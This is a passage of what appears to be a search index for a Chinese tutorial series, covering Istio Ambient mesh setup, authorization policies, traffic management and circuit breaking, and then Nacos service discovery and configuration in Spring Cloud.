\u7ec4\u4ef6\uff0c\u5b83\u8d1f\u8d23\u68c0\u6d4b\u5c5e\u4e8e Ambient \u7f51\u683c\u7684 Pod\uff0c\u5e76\u914d\u7f6e Pod \u548c ztunnel \u8282\u70b9\u4ee3\u7406\uff08\u7a0d\u540e\u5c06\u5b89\u88c5\uff09\u4e4b\u95f4\u7684\u6d41\u91cf\u91cd\u5b9a\u5411\u3002 helm install istio-cni istio/cni -n istio-system --set profile=ambient --wait \u63a7\u5236\u5e73\u9762\uff0c helm install istiod istio/istiod --namespace istio-system --set profile=ambient --wait ZTunnel \u4ee3\u7406\uff0c helm install ztunnel istio/ztunnel -n istio-system --wait","title":"Ambient \u6a21\u5f0f\u5b89\u88c5"},{"location":"24/#ambient_1","text":"\u8fd9\u91cc\u6211\u4eec\u5c31\u4e0d\u81ea\u5df1\u5b9e\u73b0\u4e86\uff0c\u4f7f\u7528 istio \u7684\u793a\u4f8b\u5e94\u7528 BookInfo\uff0c\u7531\u56db\u5957\u4e0d\u540c\u8bed\u8a00\u5b9e\u73b0\u7684\u5fae\u670d\u52a1\u7ec4\u6210\u3002 \u4f7f\u7528 kubectl \u90e8\u7f72\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u6253\u5305\u6210 Chart\uff0c\u8fd9\u91cc\u4e3a\u4e86\u65b9\u4fbf\u5c31\u4e0d\u6253\u5305\u4e86\u3002 kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.23/samples/bookinfo/platform/kube/bookinfo.yaml kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.23/samples/bookinfo/platform/kube/bookinfo-versions.yaml \u7136\u540e\u914d\u7f6e\u7f51\u5173\uff0c kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.23/samples/bookinfo/gateway-api/bookinfo-gateway.yaml \u73b0\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u540c\u4ee5\u5f80\u4e00\u6837\u8bbf\u95ee\u7f51\u5173\u7684\u670d\u52a1\uff0c\u800c\u7f51\u5173\u4f1a\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230\u5bf9\u5e94\u7684\u670d\u52a1\u4e0a\u3002\u8fd9\u4e9b\u5fae\u670d\u52a1\u5e76\u6ca1\u6709\u4ec0\u4e48\u7279\u6b8a\u6027\uff0c\u4e5f\u4e0d\u9700\u8981\u989d\u5916\u64cd\u4f5c\u3002 \u7136\u540e\u6211\u4eec\u5c31\u50cf\u4e4b\u524d\u4e00\u6837\u8bbf\u95ee\u7f51\u5173\uff0c\u6253\u5f00 minikube tunnel\uff0c\u8bbf\u95ee http://localhost/productpage \uff0c\u5c31\u80fd\u770b\u5230\u9875\u9762\u3002","title":"Ambient \u5e94\u7528\u90e8\u7f72"},{"location":"24/#_2","text":"\u6211\u4eec\u4ecd\u7136\u9700\u8981\u5b89\u88c5 Prometheus \u548c Grafana \u6765\u76d1\u63a7\u5e94\u7528\uff0c\u4ee5\u53ca\u4f7f\u7528 Kiali Dashboard\u3002 kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.23/samples/addons/prometheus.yaml kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.23/samples/addons/grafana.yaml kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.23/samples/addons/kiali.yaml \u7136\u540e\u4f7f\u7528 istioctl dashboard kiali \u6765\u6253\u5f00 Kiali Dashboard\u3002 \u7136\u540e\u6211\u4eec\u53d1\u9001\u4e00\u4e9b\u8bf7\u6c42\uff0c for i in $(seq 1 100); do curl -s http://localhost:8080/productpage; done \u7136\u540e\u6211\u4eec\u80fd\u5728 Kiali Dashboard \u4e0a\u770b\u5230\u8bf7\u6c42\u7684\u6d41\u91cf\u3002 \u4f46\u662f\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\u4e00\u4e2a\u95ee\u9898\uff1a\u53ea\u6709 productpage \u670d\u52a1\u6709\u6d41\u91cf\u3002\u8fd9\u662f\u56e0\u4e3a\uff0c\u6211\u4eec\u7684\u5fae\u670d\u52a1\u6ca1\u6709\u5728\u6570\u636e\u5e73\u9762\u6ce8\u518c\uff0c\u56e0\u6b64 istio \u65e0\u6cd5\u76d1\u63a7\u5230\u8fd9\u4e9b\u670d\u52a1\u3002 \u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u628a\u4e00\u6574\u4e2a namespace \u52a0\u5165\u5230 istio \u7684\u6570\u636e\u5e73\u9762\u4e2d\uff0c kubectl label namespace default istio.io/dataplane-mode=ambient \u73b0\u5728\uff0c\u6211\u4eec\u5c31\u80fd\u770b\u5230\u6240\u6709\u7684\u670d\u52a1\u4e86\u3002 \u6211\u4eec\u4e5f\u53ef\u4ee5\u5728 Mesh \u9875\u9762\u67e5\u770b\u6211\u4eec\u7684\u670d\u52a1\u7f51\u683c\u3002","title":"\u5e94\u7528\u76d1\u63a7"},{"location":"24/#l4","text":"\u6ce8\u610f\uff0c\u8fd9\u91cc\u7684\u9274\u6743\u662f\u4ee5 Pod \u4e3a\u5355\u4f4d\u7684\uff0c\u800c\u4e0d\u662f\u7528\u6237\u3002 \u4e0b\u9762\u7684\u7528\u6237\u521b\u5efa\u7b49\u8fc7\u7a0b\u5728\u793a\u4f8b\u4e2d\u5df2\u7ecf\u6709\u4e86\uff0c\u4e0d\u9700\u8981\u6211\u4eec\u64cd\u4f5c\uff0c\u8fd9\u91cc\u4ec5\u8fdb\u884c\u4ecb\u7ecd\u3002 \u9274\u6743\u662f\u57fa\u4e8e ServiceAccount \u7684\uff0c apiVersion: v1 kind: ServiceAccount metadata: name: bookinfo-productpage labels: account: productpage \u8981\u628a ServiceAccount \u4e0e Pod \u7ed1\u5728\u4e00\u8d77\u3002 apiVersion: apps/v1 kind: Deployment metadata: name: productpage-v1 labels: app: productpage version: v1 spec: # ... template: metadata: # ... spec: serviceAccountName: bookinfo-productpage # ... \u7136\u540e\u521b\u5efa AuthorizationPolicy\uff0c apiVersion: security.istio.io/v1 kind: AuthorizationPolicy metadata: name: productpage-viewer namespace: default spec: selector: matchLabels: app: productpage action: ALLOW rules: - from: - source: principals: - cluster.local/ns/default/sa/bookinfo-gateway-istio \u8fd9\u91cc\u7684 principal \u662f\u5141\u8bb8\u8bbf\u95ee\u7684 ServiceAccount\u3002 bookinfo-gateway-istio \u662f istio \u9ed8\u8ba4\u7684\u7f51\u5173\u670d\u52a1\u8d26\u6237\u3002principals \u7684\u683c\u5f0f\u662f\uff0c {cluster-name}/ns/{namespace}/sa/{service-account} cluster-name \u662f\u96c6\u7fa4\u7684\u540d\u5b57\uff0c\u9ed8\u8ba4\u662f cluster.local \u3002ns \u4ee3\u8868 namespace\uff0cnamespace \u586b\u5165 ServiceAccount \u6240\u5728\u7684 namespace\u3002sa \u4ee3\u8868 ServiceAccount\uff0c\u6700\u540e\u52a0\u4e0a ServiceAccount \u7684\u540d\u5b57\u3002 \u73b0\u5728\uff0c\u53ea\u5141\u8bb8 bookinfo-gateway-istio \u8bbf\u95ee productpage \u670d\u52a1\uff0c\u5373\u5fc5\u987b\u901a\u8fc7\u7f51\u5173\u3002\u6211\u4eec\u53ef\u4ee5\u968f\u610f\u8fdb\u5165\u4e00\u4e2a Pod\uff0c\u8fd0\u884c curl -s \"http://productpage:9080/productpage\" \uff0c\u4f1a\u53d1\u73b0\u65e0\u6cd5\u8bbf\u95ee\u3002","title":"L4 \u9274\u6743"},{"location":"24/#l7","text":"\u524d\u9762\u7684 L4 \u9274\u6743\u53ea\u80fd\u5728 OSI \u7b2c\u56db\u5c42\uff0c\u5373\u4f20\u8f93\u5c42\uff0cTCP/UDP \u534f\u8bae\u3002\u800c L7 \u9274\u6743\u53ef\u4ee5\u5728 OSI \u7b2c\u4e03\u5c42\uff0c\u5373\u5e94\u7528\u5c42\uff0cHTTP \u534f\u8bae\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u7ea6\u675f\u66f4\u591a\u7684\u5185\u5bb9\uff0c\u4f8b\u5982\u8bf7\u6c42\u5934\u3001\u8bf7\u6c42\u4f53\u7b49\uff0c\u56e0\u6b64\u53ef\u4ee5\u652f\u6301 OAuth2\uff0cJWT \u7b49\u7b49\u3002 \u8981\u5728 Ambient \u6a21\u5f0f\u6253\u5f00 L7 \u9274\u6743\uff0c\u9700\u8981\u628a\u9ed8\u8ba4\u7684 L4 Envoy \u4ee3\u7406\u66ff\u6362\u4e3a L7 Waypoint \u4ee3\u7406\u3002\u53ea\u8981\u521b\u5efa waypoint \u5bf9\u8c61\uff0c waypoint \u662f\u7279\u6b8a\u7684 Gateway\u3002\u8fd9\u4e2a waypoint \u4f1a\u4ee3\u7406\u6240\u6709\u901a\u8fc7\u5f53\u524d namespace \u7684\u6d41\u91cf\u3002 apiVersion: gateway.networking.k8s.io/v1 kind: Gateway metadata: labels: istio.io/waypoint-for: service name: waypoint spec: gatewayClassName: istio-waypoint listeners: - name: mesh port: 15008 protocol: HBONE \u8fd9\u91cc\u7684 listeners \u6211\u4eec\u4e0d\u9700\u8981\u5173\u5fc3\u3002\u5728\u8fd9\u4e2a listener \u4e0a\uff0c\u53ef\u4ee5\u5728 L4 \u57fa\u7840\u4e0a\u5efa\u7acb L7 \u4ee3\u7406\u3002 \u7136\u540e\u6211\u4eec\u4fee\u6539 Policy\uff0c apiVersion: security.istio.io/v1 kind: AuthorizationPolicy metadata: name: productpage-viewer namespace: default spec: targetRefs: - kind: Service group: \"\" name: productpage action: ALLOW rules: - from: - source: principals: - cluster.local/ns/default/sa/sleep to: - operation: methods: [\"GET\"] \u8fd9\u91cc\u6211\u4eec\u7ea6\u675f\u4e86\u53ea\u5141\u8bb8\u8bbf\u95ee productpage \u670d\u52a1\u7684 GET \u65b9\u6cd5\u3002\u5982\u679c\u4f7f\u7528\uff0c kubectl exec deploy/reviews-v1 -- curl -s http://productpage:9080/productpage \u53ef\u4ee5\u770b\u5230\uff0caccess denied\u3002 \u5982\u679c\u5e0c\u671b\u4f7f\u7528\uff0c\u4f8b\u5982\uff0cJWT \u9274\u6743\uff0c\u53ef\u4ee5\u4f7f\u7528 RequestAuthentication \u5bf9\u8c61\uff0c apiVersion: security.istio.io/v1 kind: RequestAuthentication metadata: name: \"jwt-example\" namespace: foo spec: selector: matchLabels: app: httpbin jwtRules: - issuer: \"testing@secure.istio.io\" jwksUri: \"https://raw.githubusercontent.com/istio/istio/release-1.23/security/tools/jwt/samples/jwks.json\" \u7136\u540e\u628a\u4e4b\u524d\u7684 principal \u6539\u6210\u8bf7\u6c42 principal\u3002 apiVersion: security.istio.io/v1 kind: AuthorizationPolicy metadata: name: require-jwt namespace: foo spec: selector: matchLabels: app: httpbin action: ALLOW rules: - from: - source: requestPrincipals: [\"testing@secure.istio.io/testing@secure.istio.io\"] \u8fd9\u91cc\u6211\u4eec\u5c31\u4e0d\u518d\u8be6\u7ec6\u4ecb\u7ecd\u4e86\u3002","title":"L7 \u9274\u6743"},{"location":"24/#_3","text":"\u6211\u4eec\u53ef\u4ee5\u5728 HTTPRoute \u4e2d\u914d\u7f6e\u6d41\u91cf\u7ba1\u7406\uff0c\u4f8b\u5982\uff0c apiVersion: gateway.networking.k8s.io/v1 kind: HTTPRoute metadata: name: reviews spec: parentRefs: - group: \"\" kind: Service name: reviews port: 9080 rules: - backendRefs: - name: reviews-v1 port: 9080 weight: 90 - name: reviews-v2 port: 9080 weight: 10 \u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u5f97 90% \u7684\u6d41\u91cf\u8bbf\u95ee reviews-v1\uff0c10% \u7684\u6d41\u91cf\u8bbf\u95ee reviews-v2\u3002","title":"\u6d41\u91cf\u7ba1\u7406"},{"location":"24/#_4","text":"\u53ef\u4ee5\u901a\u8fc7 DestinationRule \u6765\u914d\u7f6e\u7194\u65ad\uff0c apiVersion: networking.istio.io/v1 kind: DestinationRule metadata: name: httpbin spec: host: httpbin trafficPolicy: connectionPool: tcp: maxConnections: 1 http: http1MaxPendingRequests: 1 maxRequestsPerConnection: 1 outlierDetection: consecutive5xxErrors: 1 interval: 1s baseEjectionTime: 3m maxEjectionPercent: 100 \u8fd9\u91cc\u7684\u53c2\u6570\u53c2\u8003 \u6587\u6863 \u5373\u53ef\u3002","title":"\u7194\u65ad"},{"location":"24/#_5","text":"\u9650\u6d41\u53ea\u8981\u4fee\u6539 HTTPRoute\uff0c apiVersion: gateway.networking.k8s.io/v1 kind: HTTPRoute metadata: name: reviews spec: parentRefs: - group: \"\" kind: Service name: reviews port: 9080 rules: - backendRefs: - name: reviews-v2 port: 9080 timeouts: request: 500ms","title":"\u9650\u6d41"},{"location":"24/#_6","text":"\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u5bf9 k8s \u672c\u8eab\u7684\u4ecb\u7ecd\u5df2\u7ecf\u7ed3\u675f\uff0c\u6211\u4eec\u5df2\u7ecf\u4ecb\u7ecd\u4e86 k8s \u7684\u57fa\u672c\u6982\u5ff5\uff0c\u5982\u4f55\u7528 k8s \u90e8\u7f72\u5e94\u7528\uff0c\u5982\u4f55\u7528 helm \u7ba1\u7406\u5e94\u7528\uff0c\u4ee5\u53ca\u5982\u4f55\u7528\u670d\u52a1\u7f51\u683c\u3002 \u7531\u6b64\uff0c\u672c\u7cfb\u5217\u4e5f\u5c31\u7ed3\u675f\u4e86\u3002\u5e0c\u671b\u8bfb\u8005\u80fd\u591f\u901a\u8fc7\u8fd9\u4e2a\u7cfb\u5217\u4e86\u89e3\u5230 Spring Cloud\uff0ck8s \u7b49\u5fae\u670d\u52a1\u6280\u672f\u3002","title":"\u603b\u7ed3"},{"location":"25/","text":"\u4e2d\u95f4\u4ef6\u901f\u6210 Ch25 Nacos \u670d\u52a1\u6cbb\u7406 \u73b0\u5728\u6211\u4eec\u8865\u5145\u4e00\u4e9b\u4e2d\u95f4\u4ef6\u7684\u4f7f\u7528\u3002\u73b0\u5728\u6211\u4eec\u5148\u4ece Nacos \u5f00\u59cb\u3002Nacos \u4e0e\u6211\u4eec\u4e4b\u524d\u5b66\u4e60\u8fc7\u7684 Consul \u6709\u4e00\u4e9b\u76f8\u4f3c\u4e4b\u5904\u3002 \u542f\u52a8\u5e76\u8fde\u63a5 Nacos \u8fd9\u91cc\u4f9d\u7136\u4f7f\u7528 docker \u542f\u52a8\uff0c\u6309\u7167 Nacos \u5b98\u7f51\u7684\u8bf4\u660e\uff0c\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u542f\u52a8\uff0c git clone https://github.com/nacos-group/nacos-docker.git cd nacos-docker docker compose -f example/standalone-derby.yaml up \u542f\u52a8\u540e\uff0c\u4f7f\u7528 localhost:8848/nacos \u8bbf\u95ee Nacos \u63a7\u5236\u53f0\u3002 \u8981\u5c06 Spring Cloud \u9879\u76ee\u8fde\u63a5\u5230 Nacos\uff0c\u6dfb\u52a0 implementation 'com.alibaba.cloud:spring-cloud-starter-alibaba-nacos-config:2023.0.3.2' implementation 'com.alibaba.cloud:spring-cloud-starter-alibaba-nacos-discovery:2023.0.3.2' implementation 'org.springframework.cloud:spring-cloud-starter-bootstrap:4.2.0' \u5176\u4e2d\u7b2c\u4e00\u4e2a\u662f\u7528\u4e8e\u670d\u52a1\u914d\u7f6e\u7684\uff0c\u7b2c\u4e8c\u4e2a\u662f\u7528\u4e8e\u670d\u52a1\u53d1\u73b0\u7684\u3002\u8fd9\u4e24\u4e2a\u9700\u8981\u4f9d\u8d56 bootstrap \u5305\uff0c\u8fd9\u4e2a\u5305\u7684\u529f\u80fd\u6211\u4eec\u5df2\u7ecf\u5728\u524d\u6587\u4ecb\u7ecd\u8fc7\u4e86\uff0c\u7528\u4e8e\u533a\u5206 bootstrap \u9636\u6bb5\u7684\u914d\u7f6e\u548c\u5b9e\u9645\u5e94\u7528\u7684\u914d\u7f6e\u3002\u6240\u6709\u542f\u52a8\u5e94\u7528\u5fc5\u987b\u7684\u914d\u7f6e\u653e\u5728 bootstrap \u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u6240\u6709\u5e94\u7528\u7684\u914d\u7f6e\u653e\u5728 application \u914d\u7f6e\u6587\u4ef6\u4e2d\u3002\u4e0d\u8fc7\u8fd9\u91cc\u6211\u4eec\u4e0d\u9700\u8981\u989d\u5916\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u53ea\u9700\u8981\u5728 application.properties \u4e2d\u914d\u7f6e\u5373\u53ef\u3002\u4f46\u662f\u4f9d\u7136\u5fc5\u987b\u5f15\u5165\u8fd9\u4e2a\u5305\u3002 \u7136\u540e\u914d\u7f6e\uff0c spring.cloud:nacos.config.server-addr \u53c2\u6570\uff0c\u586b\u5165 localhost:8848 \u3002 \u542f\u52a8\u540e\uff0c\u53ef\u4ee5\u5728 Nacos \u63a7\u5236\u53f0\u770b\u5230\u6ce8\u518c\u7684\u670d\u52a1\u3002 \u4e4b\u540e\u670d\u52a1\u8c03\u7528\u548c\u6211\u4eec\u4e4b\u524d\u8bb2\u89e3\u7684\u5b8c\u5168\u4e00\u81f4\uff0c\u542f\u7528\u8d1f\u8f7d\u5747\u8861\u548c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u670d\u52a1\u540d\uff0c\u4e0d\u518d\u9700\u8981\u989d\u5916\u7684\u914d\u7f6e\u3002 Nacos \u4f5c\u4e3a\u914d\u7f6e\u4e2d\u5fc3 \u4f7f\u7528 Value \u6ce8\u89e3 \u4e0b\u9762\u6f14\u793a\u5982\u4f55\u4f7f\u7528 Nacos \u540c\u6b65\u914d\u7f6e\u3002\u4f9d\u8d56\u6211\u4eec\u5df2\u7ecf\u5728\u4e0a\u9762\u6dfb\u52a0\u4e86\u3002 \u5728 Nacos \u63a7\u5236\u53f0\u9875\u9762\uff0c\u6b64\u5904\u9009\u62e9\u914d\u7f6e\u5217\u8868\uff0c\u7136\u540e\u65b0\u5efa\u4e00\u4e2a\u914d\u7f6e\uff0c\u586b\u5165\u914d\u7f6e\u540d\u548c\u914d\u7f6e\u5185\u5bb9\u3002 \u521b\u5efa\u914d\u7f6e\u9875\u9762\u7684 Data ID \u5373\u6587\u4ef6\u540d\u3002 \u6b64\u5916\uff0cNacos \u4e5f\u63d0\u4f9b\u4e86\u547d\u540d\u7a7a\u95f4\u673a\u5236\uff0c\u53ef\u4ee5\u7528\u4e8e\u533a\u5206\u4e0d\u540c\u7684\u73af\u5883\u3002\u8fd9\u4e2a\u529f\u80fd\u5728 Nacos \u63a7\u5236\u53f0\u7684\u5de6\u4e0a\u89d2\u53ef\u4ee5\u770b\u5230\u3002 \u7136\u540e\u5728 Spring Cloud \u9879\u76ee\u4e2d\uff0c\u6dfb\u52a0\uff0c spring: config: import: - nacos:d.yml \u5982\u679c\u9700\u8981\u6307\u5b9a\u547d\u540d\u7a7a\u95f4\u548c\u5206\u7ec4\uff0c\u4f7f\u7528\uff0c spring: cloud: nacos: config: namespace: 11111111-1111-1111-1111-111111111111 config: import: - nacos:d.yaml?group=DEFAULT_GROUP \u5982\u679c\u8981\u5b9e\u73b0 profile \u533a\u5206\uff0c\u53ef\u4ee5\u5229\u7528 yaml \u7684\u591a\u6587\u6863\u7279\u6027\uff0c spring: profiles: active: dev --- spring: config: import: - nacos:d.yml activate: on-profile: dev \u73b0\u5728\u521b\u5efa\u4e00\u4e2a Controller \u7528\u4e8e\u83b7\u53d6\u914d\u7f6e\u7684\u53c2\u6570\uff0c package com.github.fingerbone; import org.springframework.web.bind.annotation.RestController; import org.springframework.beans.factory.annotation.Value; import org.springframework.context.annotation.Configuration; import org.springframework.web.bind.annotation.GetMapping; @RestController @Configuration public class TestController { @Value(\"${hello}\") private String hello; @GetMapping(\"/hello\") public String getHello() { return hello; } } \u73b0\u5728\u6253\u5f00\u7f51\u9875\u6d4b\u8bd5\uff0c\u53ef\u4ee5\u770b\u5230\u8fd4\u56de\u4e86\u914d\u7f6e\u4e2d\u7684\u5185\u5bb9\u3002 \u540c\u6837\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 @RefreshScope \u6ce8\u89e3\u6765\u5b9e\u73b0\u914d\u7f6e\u7684\u52a8\u6001\u5237\u65b0\u3002\u8fd9\u70b9\u5728\u4e4b\u524d\u7684\u6587\u7ae0\u4e2d\u5df2\u7ecf\u8bb2\u8fc7\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002 \u4f7f\u7528 ConfigurationProperties \u6ce8\u89e3 \u6b64\u5916\uff0c\u8fd8\u6709\u4e00\u79cd\u65b9\u6cd5\u53ef\u4ee5\u6279\u91cf\u7b80\u5355\u5730\u83b7\u53d6\u914d\u7f6e\uff0c\u5373\u4f7f\u7528 @ConfigurationProperties \u6ce8\u89e3\u3002\u8fd9\u4e2a\u6ce8\u89e3\u53ef\u4ee5\u5c06\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u914d\u7f6e\u6620\u5c04\u5230\u4e00\u4e2a\u7c7b\u4e2d\uff0c\u7136\u540e\u76f4\u63a5\u6ce8\u5165\u8fd9\u4e2a\u7c7b\u5373\u53ef\u3002\u8fd9\u4e00\u70b9\u6211\u4eec\u4e4b\u524d\u6ca1\u6709\u8bb2\u8fc7\uff0c\u5728\u8fd9\u91cc\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0b\u3002 \u5728\u73b0\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u4f7f\u7528\uff0c @Data @Component @ConfigurationProperties(prefix = \"\") public class Config { private String hello; } \u8fd9\u6837\u76f4\u63a5\u6ce8\u5165\u8fd9\u4e2a Bean \u5373\u53ef\u3002\u6ce8\u610f\uff0c\u8fd9\u91cc\u4e0d\u9700\u8981 @RefreshScope \u6ce8\u89e3\uff0c\u4e5f\u4f1a\u81ea\u52a8\u5237\u65b0\u3002 \u6b64\u5916\uff0c\u8fd9\u4e2a\u7c7b\u4e2d\u5b57\u6bb5\u4e0e\u914d\u7f6e\u6587\u4ef6\u7684\u6620\u5c04\u89c4\u5219\u662f prefix.field \uff0c prefix \u5373\u6ce8\u89e3\u91cc\u9762\u7684\u53c2\u6570\uff0c field \u662f\u628a\u7c7b\u7684\u9a7c\u5cf0\u547d\u540d\u7684\u540d\u79f0\u8f6c\u6362\u4e3a kebab-case \u7684\u540d\u79f0\u3002\u4f8b\u5982\uff0c helloWorld \u5bf9\u5e94 hello-world \u3002\u53ea\u8981\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u914d\u7f6e\u7b26\u5408\u8fd9\u4e2a\u89c4\u5219\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u6ce8\u5165\u3002 \u76d1\u542c\u914d\u7f6e\u53d8\u5316 \u6b64\u5916\u6211\u4eec\u8fd8\u53ef\u4ee5\u6dfb\u52a0\u914d\u7f6e\u53d8\u5316\u7684\u56de\u8c03\uff0c\u53ea\u8981\u5411 NacosConfigManager \u4e2d\u6dfb\u52a0\u76d1\u542c\u5668\u5373\u53ef\u3002 @Bean ApplicationRunner applicationRunner(NacosConfigManager nacosConfigManager) { return args -> { nacosConfigManager.getConfigService().addListener(\"d.yml\", \"DEFAULT_GROUP\", new Listener() { @Override public void receiveConfigInfo(String configInfo) { System.out.println(\"Config changed: \" + configInfo); } @Override public Executor getExecutor() { return Executors.newSingleThreadExecutor(); } }); }; }","title":"Nacos \u670d\u52a1\u6cbb\u7406"},{"location":"25/#ch25-nacos","text":"\u73b0\u5728\u6211\u4eec\u8865\u5145\u4e00\u4e9b\u4e2d\u95f4\u4ef6\u7684\u4f7f\u7528\u3002\u73b0\u5728\u6211\u4eec\u5148\u4ece Nacos \u5f00\u59cb\u3002Nacos \u4e0e\u6211\u4eec\u4e4b\u524d\u5b66\u4e60\u8fc7\u7684 Consul \u6709\u4e00\u4e9b\u76f8\u4f3c\u4e4b\u5904\u3002","title":"\u4e2d\u95f4\u4ef6\u901f\u6210 Ch25 Nacos \u670d\u52a1\u6cbb\u7406"},{"location":"25/#nacos","text":"\u8fd9\u91cc\u4f9d\u7136\u4f7f\u7528 docker \u542f\u52a8\uff0c\u6309\u7167 Nacos \u5b98\u7f51\u7684\u8bf4\u660e\uff0c\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u542f\u52a8\uff0c git clone https://github.com/nacos-group/nacos-docker.git cd nacos-docker docker compose -f example/standalone-derby.yaml up \u542f\u52a8\u540e\uff0c\u4f7f\u7528 localhost:8848/nacos \u8bbf\u95ee Nacos \u63a7\u5236\u53f0\u3002 \u8981\u5c06 Spring Cloud \u9879\u76ee\u8fde\u63a5\u5230 Nacos\uff0c\u6dfb\u52a0 implementation 'com.alibaba.cloud:spring-cloud-starter-alibaba-nacos-config:2023.0.3.2' implementation 'com.alibaba.cloud:spring-cloud-starter-alibaba-nacos-discovery:2023.0.3.2' implementation 'org.springframework.cloud:spring-cloud-starter-bootstrap:4.2.0' \u5176\u4e2d\u7b2c\u4e00\u4e2a\u662f\u7528\u4e8e\u670d\u52a1\u914d\u7f6e\u7684\uff0c\u7b2c\u4e8c\u4e2a\u662f\u7528\u4e8e\u670d\u52a1\u53d1\u73b0\u7684\u3002\u8fd9\u4e24\u4e2a\u9700\u8981\u4f9d\u8d56 bootstrap \u5305\uff0c\u8fd9\u4e2a\u5305\u7684\u529f\u80fd\u6211\u4eec\u5df2\u7ecf\u5728\u524d\u6587\u4ecb\u7ecd\u8fc7\u4e86\uff0c\u7528\u4e8e\u533a\u5206 bootstrap \u9636\u6bb5\u7684\u914d\u7f6e\u548c\u5b9e\u9645\u5e94\u7528\u7684\u914d\u7f6e\u3002\u6240\u6709\u542f\u52a8\u5e94\u7528\u5fc5\u987b\u7684\u914d\u7f6e\u653e\u5728 bootstrap \u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u6240\u6709\u5e94\u7528\u7684\u914d\u7f6e\u653e\u5728 application \u914d\u7f6e\u6587\u4ef6\u4e2d\u3002\u4e0d\u8fc7\u8fd9\u91cc\u6211\u4eec\u4e0d\u9700\u8981\u989d\u5916\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u53ea\u9700\u8981\u5728 application.properties \u4e2d\u914d\u7f6e\u5373\u53ef\u3002\u4f46\u662f\u4f9d\u7136\u5fc5\u987b\u5f15\u5165\u8fd9\u4e2a\u5305\u3002 \u7136\u540e\u914d\u7f6e\uff0c spring.cloud:nacos.config.server-addr \u53c2\u6570\uff0c\u586b\u5165 localhost:8848 \u3002 \u542f\u52a8\u540e\uff0c\u53ef\u4ee5\u5728 Nacos \u63a7\u5236\u53f0\u770b\u5230\u6ce8\u518c\u7684\u670d\u52a1\u3002 \u4e4b\u540e\u670d\u52a1\u8c03\u7528\u548c\u6211\u4eec\u4e4b\u524d\u8bb2\u89e3\u7684\u5b8c\u5168\u4e00\u81f4\uff0c\u542f\u7528\u8d1f\u8f7d\u5747\u8861\u548c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u670d\u52a1\u540d\uff0c\u4e0d\u518d\u9700\u8981\u989d\u5916\u7684\u914d\u7f6e\u3002","title":"\u542f\u52a8\u5e76\u8fde\u63a5 Nacos"},{"location":"25/#nacos_1","text":"","title":"Nacos \u4f5c\u4e3a\u914d\u7f6e\u4e2d\u5fc3"},{"location":"25/#value","text":"\u4e0b\u9762\u6f14\u793a\u5982\u4f55\u4f7f\u7528 Nacos \u540c\u6b65\u914d\u7f6e\u3002\u4f9d\u8d56\u6211\u4eec\u5df2\u7ecf\u5728\u4e0a\u9762\u6dfb\u52a0\u4e86\u3002 \u5728 Nacos \u63a7\u5236\u53f0\u9875\u9762\uff0c\u6b64\u5904\u9009\u62e9\u914d\u7f6e\u5217\u8868\uff0c\u7136\u540e\u65b0\u5efa\u4e00\u4e2a\u914d\u7f6e\uff0c\u586b\u5165\u914d\u7f6e\u540d\u548c\u914d\u7f6e\u5185\u5bb9\u3002 \u521b\u5efa\u914d\u7f6e\u9875\u9762\u7684 Data ID \u5373\u6587\u4ef6\u540d\u3002 \u6b64\u5916\uff0cNacos \u4e5f\u63d0\u4f9b\u4e86\u547d\u540d\u7a7a\u95f4\u673a\u5236\uff0c\u53ef\u4ee5\u7528\u4e8e\u533a\u5206\u4e0d\u540c\u7684\u73af\u5883\u3002\u8fd9\u4e2a\u529f\u80fd\u5728 Nacos \u63a7\u5236\u53f0\u7684\u5de6\u4e0a\u89d2\u53ef\u4ee5\u770b\u5230\u3002 \u7136\u540e\u5728 Spring Cloud \u9879\u76ee\u4e2d\uff0c\u6dfb\u52a0\uff0c spring: config: import: - nacos:d.yml \u5982\u679c\u9700\u8981\u6307\u5b9a\u547d\u540d\u7a7a\u95f4\u548c\u5206\u7ec4\uff0c\u4f7f\u7528\uff0c spring: cloud: nacos: config: namespace: 11111111-1111-1111-1111-111111111111 config: import: - nacos:d.yaml?group=DEFAULT_GROUP \u5982\u679c\u8981\u5b9e\u73b0 profile \u533a\u5206\uff0c\u53ef\u4ee5\u5229\u7528 yaml \u7684\u591a\u6587\u6863\u7279\u6027\uff0c spring: profiles: active: dev --- spring: config: import: - nacos:d.yml activate: on-profile: dev \u73b0\u5728\u521b\u5efa\u4e00\u4e2a Controller \u7528\u4e8e\u83b7\u53d6\u914d\u7f6e\u7684\u53c2\u6570\uff0c package com.github.fingerbone; import org.springframework.web.bind.annotation.RestController; import org.springframework.beans.factory.annotation.Value; import org.springframework.context.annotation.Configuration; import org.springframework.web.bind.annotation.GetMapping; @RestController @Configuration public class TestController { @Value(\"${hello}\") private String hello; @GetMapping(\"/hello\") public String getHello() { return hello; } } 